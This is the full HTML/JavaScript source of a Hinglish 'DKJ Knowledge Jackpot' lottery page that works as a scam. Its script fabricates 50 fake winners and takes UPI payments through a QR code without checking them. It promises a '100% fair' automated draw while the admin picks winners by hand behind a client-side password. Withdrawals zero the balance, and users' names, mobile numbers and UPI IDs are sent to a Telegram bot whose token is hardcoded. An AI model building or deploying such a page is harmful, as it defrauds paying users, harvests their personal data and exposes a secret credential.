<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>DKJ KNOWLEDGE JACKPOT</title>
    <style>
        :root { --gold: #c5a059; --dark: #0f2027; --tg-blue: #0088cc; }
        body { font-family: sans-serif; background: #f4f4f4; margin: 0; padding-bottom: 80px; -webkit-tap-highlight-color: transparent; }
        .header { background: var(--dark); color: var(--gold); padding: 15px; text-align: center; border-bottom: 3px solid var(--gold); cursor: pointer; }
        .marquee-box { background: #000; color: #fff; padding: 5px; font-weight: bold; border-bottom: 1px solid var(--gold); }
        .card { background: white; margin: 12px; padding: 20px; border-radius: 15px; box-shadow: 0 3px 10px rgba(0,0,0,0.1); text-align: center; }
        .bal-text { font-size: 35px; color: #27ae60; font-weight: bold; margin: 10px 0; }
        .pg-container { background: #ddd; height: 12px; border-radius: 10px; margin: 10px 0; overflow: hidden; }
        .pg-bar { background: var(--gold); height: 100%; width: 52%; transition: 0.5s; }
        .btn { width: 100%; padding: 14px; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 10px; display: block; box-sizing: border-box; text-decoration: none; text-align: center; font-size: 14px; }
        .btn-dark { background: var(--dark); color: white; }
        .btn-gold { background: var(--gold); color: black; }
        .btn-tg { background: var(--tg-blue); color: white; }
        .scroll-box { display: flex; overflow-x: auto; padding: 10px; gap: 15px; scrollbar-width: none; }
        .draw-box { min-width: 160px; background: white; padding: 15px; border-radius: 12px; border: 2px solid var(--dark); text-align: center; color: #000; }
        #popup { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); z-index: 1000; color: white; padding: 20px; box-sizing: border-box; text-align: center; overflow-y: auto; }
        input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: none; font-weight: bold; color: #000; outline: none; box-sizing: border-box; }
        .list-item { background: #222; padding: 12px; border-radius: 8px; margin-bottom: 8px; text-align: left; border-left: 4px solid var(--gold); }
        .win-amt { float: right; color: #27ae60; font-weight: bold; }
        .tc-text { text-align: left; font-size: 13px; line-height: 1.6; color: #ccc; }
    </style>
</head>
<body>

<div class="marquee-box"><marquee>üî• Lucky Winner Draw Date: 13 March 2026 || Join Mega Draw Now & Win Big!! üî•</marquee></div>

<div class="header" onclick="adminMode()">
    <h1 style="margin:0; font-size:18px;">DKJ KNOWLEDGE JACKPOT</h1>
    <div id="uHi" style="font-size: 11px; color: white; margin-top: 5px;">Welcome Guest (Admin: Tap)</div>
</div>

<div class="card">
    <p style="margin:0; font-weight:bold; color: #666;">MY WALLET BALANCE</p>
    <div class="bal-text" id="vBal">‚Çπ0</div>
    <button class="btn btn-dark" onclick="withdraw()">WITHDRAW MONEY</button>
</div>

<div class="card">
    <p style="margin:0; font-size:12px; font-weight:bold;">DRAW PROGRESS: 52%</p>
    <div class="pg-container"><div class="pg-bar"></div></div>
    <button class="btn btn-gold" onclick="alert('Invite Link Copied!')">COPY INVITE LINK</button>
</div>

<div class="scroll-box">
    <div class="draw-box" style="border-color: var(--gold);">
        <h3>MEGA</h3><h2>‚Çπ100</h2>
        <button class="btn btn-dark" onclick="join(100)">JOIN NOW</button>
    </div>
    <div class="draw-box" style="opacity:0.6; background:#eee;">
        <h3>SILVER</h3><h2>‚Çπ200</h2>
        <button class="btn" style="background:#888; color:white; cursor:not-allowed;">LOCKED</button>
    </div>
    <div class="draw-box" style="opacity:0.6; background:#eee;">
        <h3>GOLD</h3><h2>‚Çπ500</h2>
        <button class="btn" style="background:#888; color:white; cursor:not-allowed;">LOCKED</button>
    </div>
</div>

<div style="padding: 10px;">
    <button id="rBtn" class="btn btn-gold" onclick="showReg()">‚ûï CREATE ACCOUNT</button>
    <button class="btn btn-dark" onclick="showProfile()">üë§ MY PROFILE & CODES</button>
    <button class="btn btn-gold" onclick="showWinners()">üèÜ TOP WINNERS</button>
    <button class="btn" style="background:#555; color:white;" onclick="showTC()">üìÑ TERMS & CONDITIONS</button>
    <a href="https://t.me/dkj_knowledge_jackoprt" target="_blank" class="btn btn-tg">üì¢ JOIN TELEGRAM</a>
</div>

<div id="popup">
    <div id="pContent"></div>
    <button onclick="closeP()" style="margin-top:20px; background:red; color:white; border:none; padding:10px 40px; border-radius:10px; font-weight:bold;">CLOSE</button>
</div>

<script>
    const TG_BOT_TOKEN = "8357735991:AAHUnhnXj0MaNi-Z1XtitwMy994xssKRsyg";
    const TG_ADMIN_ID = "8072402346"; 
    const UPI_ID = "paytmqr6vnhle@ptys";

    let db = JSON.parse(localStorage.getItem('dkj_vfinal_db')) || { users: [], entries: [], winners: [] };
    let currentUser = JSON.parse(localStorage.getItem('dkj_vfinal_user')) || null;

    // Demo Winners with proper formatting
    if(db.winners.length < 50){
        let dNames = ["Rahul","Amit","Priya","Suresh","Vikram","Kavita","Soniya","Raj","Arjun","Manish","Nitin","Deepak"];
        for(let i=0; i<50; i++){
            db.winners.push({
                name: dNames[Math.floor(Math.random()*dNames.length)],
                prize: [500, 1000, 2000, 5000][Math.floor(Math.random()*4)],
                code: "DKJ-" + Math.floor(100000+Math.random()*900000)
            });
        }
    }

    function save() {
        localStorage.setItem('dkj_vfinal_db', JSON.stringify(db));
        localStorage.setItem('dkj_vfinal_user', JSON.stringify(currentUser));
    }

    function tgMsg(msg) {
        fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_ADMIN_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`).catch(e => console.log(e));
    }

    function showReg() {
        document.getElementById('pContent').innerHTML = `<h2>REGISTER</h2><input id="rn" placeholder="Full Name"><input id="rm" type="number" placeholder="Mobile"><input id="rp" type="password" placeholder="Password"><button class="btn btn-gold" onclick="doReg()">CREATE ACCOUNT</button>`;
        document.getElementById('popup').style.display = 'block';
    }

    function doReg() {
        let n = document.getElementById('rn').value, m = document.getElementById('rm').value, p = document.getElementById('rp').value;
        if(!n || !m || !p) return alert("Sari jankari bharein!");
        currentUser = { name: n, mob: m, pass: p, bal: 0, id: Math.floor(1000+Math.random()*9000), codes: [] };
        db.users.push(currentUser); save(); updateUI();
        tgMsg(`‚úÖ *New User:* ${n}\nüì± *Mob:* ${m}`);
        alert("Account Successfully Ban Gaya!"); closeP();
    }

    function join(amt) {
        if(!currentUser) return alert("Pehle Account Banayein!");
        document.getElementById('pContent').innerHTML = `<h2>PAYMENT ‚Çπ${amt}</h2><p>QR Scan karein aur Payment karein</p><img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=upi://pay?pa=${UPI_ID}%26am=${amt}"><button class="btn btn-gold" onclick="generateTicket()">PAID - GET CODE</button>`;
        document.getElementById('popup').style.display = 'block';
    }

    function generateTicket() {
        let ticket = "DKJ-" + Math.floor(100000 + Math.random()*900000);
        currentUser.codes.push(ticket);
        db.entries.push({ uId: currentUser.id, name: currentUser.name, code: ticket });
        save(); tgMsg(`üéü *New Ticket:* ${currentUser.name}\nüé´ *Code:* ${ticket}`);
        alert("Success! Aapka Ticket Code: " + ticket); closeP(); updateUI();
    }

    function showTC() {
        document.getElementById('pContent').innerHTML = `<h2>TERMS & CONDITIONS</h2>
        <div class="tc-text">
            <p>1. <b>Hissa Lena:</b> Is jackpot mein sirf 18+ saal ke bhartiya nagrik hi hissa le sakte hain.</p>
            <p>2. <b>Fair Play:</b> Winners ka chayan automated random system dwara kiya jata hai jo 100% fair hai.</p>
            <p>3. <b>Draw Date:</b> Mega Draw 13 March 2026 ko hoga. Date badalne ka adhikaar management ke paas hai.</p>
            <p>4. <b>Inaam:</b> Jeeti rashi 24 ghante ke andar withdraw ki ja sakti hai.</p>
            <p>5. <b>Zimmewari:</b> Galat UPI ya Bank details dene par nuksan user ka hoga.</p>
        </div>`;
        document.getElementById('popup').style.display = 'block';
    }

    function showWinners() {
        let h = "<h2>üèÜ TOP WINNERS</h2>";
        let displayList = [...db.winners].reverse().slice(0, 40);
        displayList.forEach(w => { 
            h += `<div class="list-item">
                    <span class="win-amt">‚Çπ${w.prize}</span>
                    <b>${w.name}</b><br>
                    <small style="color:#aaa;">Ticket: ${w.code}</small>
                  </div>`; 
        });
        document.getElementById('pContent').innerHTML = h;
        document.getElementById('popup').style.display = 'block';
    }

    function showProfile() {
        if(!currentUser) return alert("Login karein!");
        document.getElementById('pContent').innerHTML = `<h2>MY PROFILE</h2><p>Name: ${currentUser.name}</p><p>ID: ${currentUser.id}</p><p>My Codes: ${currentUser.codes.join(", ") || "No Tickets"}</p><button class="btn btn-dark" onclick="logout()">LOGOUT</button>`;
        document.getElementById('popup').style.display = 'block';
    }

    function adminMode() {
        let pw = prompt("Admin PW:");
        if(pw !== "7860") return;
        let act = prompt("1: Select Winner\n2: Reset Data");
        if(act=="1") {
            let h = "<h2>Select Winner</h2>";
            db.entries.forEach(e => { h += `<div class="list-item" onclick="makeWin('${e.uId}','${e.code}')">${e.name} (${e.code})</div>`; });
            document.getElementById('pContent').innerHTML = h || "No active tickets"; document.getElementById('popup').style.display = 'block';
        } else if(act=="2") { if(confirm("Clear All?")) { localStorage.clear(); location.reload(); } }
    }

    function makeWin(uid, code) {
        let amt = prompt("Prize Amount?");
        if(!amt) return;
        let entryIdx = db.entries.findIndex(x => x.code === code);
        let userEntry = db.entries[entryIdx];
        db.winners.push({name: userEntry.name, prize: amt, code: code});
        let u = db.users.find(x => x.id == uid);
        if(u) u.bal += parseInt(amt);
        db.entries.splice(entryIdx, 1);
        save(); alert("Winner Added!"); closeP(); updateUI();
    }

    function withdraw() {
        if(!currentUser || currentUser.bal <= 0) return alert("No Balance!");
        let det = prompt("UPI ID likhein:");
        if(det) { 
            tgMsg(`üí∞ *Withdraw Request*\nUser: ${currentUser.name}\nAmt: ‚Çπ${currentUser.bal}\nUPI: ${det}`); 
            currentUser.bal = 0; save(); updateUI(); alert("Request Bhej Di!"); 
        }
    }

    function updateUI() {
        if(currentUser) {
            document.getElementById('uHi').innerText = "Hi, " + currentUser.name + " (ID: " + currentUser.id + ")";
            document.getElementById('vBal').innerText = "‚Çπ" + (currentUser.bal || 0);
            document.getElementById('rBtn').style.display = 'none';
        }
    }
    function logout() { localStorage.removeItem('dkj_vfinal_user'); location.reload(); }
    function closeP() { document.getElementById('popup').style.display = 'none'; }
    window.onload = updateUI;
</script>
</body>
</html>
